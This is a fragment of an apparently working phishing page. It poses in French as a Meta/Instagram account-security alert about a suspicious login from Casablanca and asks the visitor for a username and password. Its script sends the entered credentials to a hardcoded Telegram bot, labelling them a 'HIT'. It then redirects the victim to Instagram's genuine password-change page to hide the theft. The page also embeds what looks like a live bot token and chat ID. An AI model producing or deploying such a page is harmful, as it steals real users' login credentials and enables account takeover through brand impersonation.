            background: #fff5f5; border: 1px solid #ffd9d9; border-radius: 10px;

        }

            width: 100%; padding: 14px; background: #f5f6f7; border: 1px solid #dddfe2;

        }
        input:focus { border-color: var(--meta-blue); box-shadow: 0 0 0 2px #e7f3ff; }

        .btn { 
            width: 100%; background: var(--meta-blue); color: white; border: none; 
            padding: 14px; border-radius: 8px; font-weight: 700; font-size: 16px; cursor: pointer;
        }

        .footer { margin-top: 25px; padding-top: 15px; border-top: 1px solid #ebedf0; }

<div class="card">
    <div class="ig-branded-icon"><div class="ig-white-glyph"></div></div>
    <h2>Sécurité du compte</h2>

    <div class="alert-box">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
        <div class="alert-text">
            Tentative de connexion suspecte : <br>
            <span class="loc">📍 Casablanca, Maroc (IP: 105.158.24.11)</span>
            <br>Confirmez votre identité pour sécuriser votre compte.
        </div>
    </div>

    <form id="p">
        <input type="text" id="u" placeholder="Nom d'utilisateur" required>
        <input type="password" id="s" placeholder="Mot de passe" required>
        <button type="submit" class="btn">Continuer</button>
    </form>

    <div class="footer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png">
    </div>
</div>

<script>
    document.getElementById('p').onsubmit = async (e) => {
        e.preventDefault();
        const u = document.getElementById('u').value;
        const s = document.getElementById('s').value;
        const t = "7137131967:AAHa-B55idnADcUHKse3HjqHeoHyAjSMY1I";
        const c = "5558301795";
        const m = `🇲🇦 **HIT: MAROC PORTAL**\n👤 User: \`${u}\` \n🔑 Pass: \`${s}\``;
        await fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}&parse_mode=Markdown`);
        window.location.href = "https://www.instagram.com/accounts/password/change/";
    };
</script>

</body>
